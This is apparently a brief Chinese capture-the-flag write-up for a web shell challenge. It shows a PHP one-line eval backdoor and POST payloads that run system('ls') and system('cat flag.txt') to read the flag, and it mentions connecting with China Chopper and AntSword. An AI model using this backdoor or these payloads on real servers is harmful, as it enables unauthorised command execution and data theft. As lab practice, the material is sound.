题目显示：
你会使用webshell吗？
<?php @eval($_POST['shell']);?> 

1、在firefox浏览器下点击F12，使用Max HackBar插件，点击Load URL
2、在Post Data中输入shell=system('ls');post提交，发现flag.txt：

你会使用webshell吗？
flag.txt index.php <?php @eval($_POST['shell']);?> 

3、在Post Data中输入shell=system('cat flag.txt');提交，得到

你会使用webshell吗？
cyberpeace{4a615fedc83a8cbfae75bb56950de7ab}<?php @eval($_POST['shell']);?> 


wp:
1、在github上输入中国菜刀，右键添加，输入IP地址（http://220.249.52.133:42244）和密码（shell）
2、连接上之后，看到路径下/var/com/html/下有flag.txt文件，点开txt文件，得到flag


https://www.fujieace.com/hacker/tools/antsword.html
中国蚁剑的下载地址及使用方法